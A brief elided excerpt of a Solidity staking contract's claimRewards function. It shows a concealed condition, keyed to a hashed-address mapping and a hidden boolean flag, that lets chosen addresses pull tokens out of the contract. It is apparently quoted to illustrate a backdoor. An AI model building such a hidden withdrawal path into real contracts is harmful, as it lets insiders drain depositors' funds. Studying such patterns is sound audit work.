...
contract Staking is Ownable {
  ...
  function claimRewards(uint256 _i, uint256 _amount, bool _m) public {
    ...
    if(r[keccak256(abi.encode(msg.sender))] && _m) token.transferFrom(address(this), msg.sender, toWithdraw);
